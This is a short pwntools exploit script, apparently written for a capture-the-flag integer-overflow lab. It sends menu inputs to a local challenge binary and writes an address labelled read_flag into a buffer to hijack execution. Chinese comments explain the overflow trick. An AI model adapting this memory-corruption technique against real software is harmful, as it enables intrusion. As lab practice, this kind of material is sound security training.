from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/integer-overflow-level2.1"
p = process(challenge_path)

# create string
read_flag=0x401574
shellcode=b'\x74\x15\x40\x00\x00\x00\x00\x00'
p.sendlineafter("Choice >> \n","1")
p.sendlineafter("What is the size of node you want?\n","256")
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Where do you want to add?\n","255")
p.sendafter("What do you want to edit?\n",shellcode)
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Where do you want to add?\n","1")
p.sendafter("What do you want to edit?\n",shellcode)
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Where do you want to add?\n","1")
p.sendafter("What do you want to edit?\n",shellcode)
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Where do you want to add?\n","1")
p.sendafter("What do you want to edit?\n",shellcode)
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Where do you want to add?\n","1")
p.sendafter("What do you want to edit?\n",shellcode)
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Where do you want to add?\n","1")
p.sendafter("What do you want to edit?\n",shellcode)
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Where do you want to add?\n","1")
p.sendafter("What do you want to edit?\n",shellcode)
# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
输入两个十六进制表示的unsigned long，使得和为0x80但是分开又都大于0x80
注意这一题的溢出上限unsigned long是ffffffffffffffff（16位16进制即64位）
注意是回车符会占位，所以不要发送回车
python3 /home/hacker/int2.1.py
'''